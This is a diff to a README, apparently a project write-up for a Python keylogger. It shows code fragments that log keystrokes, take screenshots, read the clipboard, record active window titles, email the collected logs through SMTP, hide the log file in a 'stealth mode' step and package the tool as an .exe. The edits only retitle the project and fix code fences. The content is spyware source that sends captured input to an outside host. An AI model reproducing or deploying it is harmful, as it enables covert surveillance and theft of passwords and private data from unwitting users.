@@ -1,4 +1,4 @@
-# PROJECTNAME
+# PYTHON-BASED KEYLOGGER
 
 ## Objective
 
@@ -53,7 +53,6 @@ with Listener(on_press=log_keystroke) as listener:
     listener.join()
 ```
 
-
 2️⃣ **Capturing Screenshots**
 * Used the Pillow (PIL) library to capture and save screenshots at regular intervals.
 * Saved screenshots to a predefined directory.
@@ -67,7 +66,8 @@ def take_screenshot():
     screenshot = ImageGrab.grab()
     screenshot.save(f"screenshot_{time.strftime('%Y%m%d-%H%M%S')}.png")
 
-take_screenshot()```
+take_screenshot()
+```
 
 3️⃣ **Capturing Clipboard Content**
 * Used pyperclip to extract the contents of the clipboard.
@@ -82,7 +82,8 @@ def get_clipboard():
     with open("logs.txt", "a") as file:
         file.write("\nClipboard Data: " + clipboard_data + "\n")
 
-get_clipboard()```
+get_clipboard()
+```
 
 4️⃣ **Logging Active Window Titles**
 * Used pygetwindow to track and log the active window.
@@ -98,7 +99,8 @@ def get_active_window():
         with open("logs.txt", "a") as file:
             file.write("\nActive Window: " + active_window.title + "\n")
 
-get_active_window()```
+get_active_window()
+```
 
 5️⃣ **Sending Data via Email**
 * Used Python’s built-in smtplib to send collected logs and screenshots via email.
@@ -128,7 +130,8 @@ def send_logs():
     server.send_message(msg)
     server.quit()
 
-send_logs()```
+send_logs()
+```
 
 6️⃣ **Hiding the Keylogger (Stealth Mode)**
 * Ensured the script ran in the background without a visible console window.
@@ -141,7 +144,8 @@ import os
 def hide_console():
     os.system("attrib +h logs.txt")
 
-hide_console()```
+hide_console()
+```
 
 7️⃣ **Converting to an Executable**
 * Used pyinstaller to package the script as an .exe file.
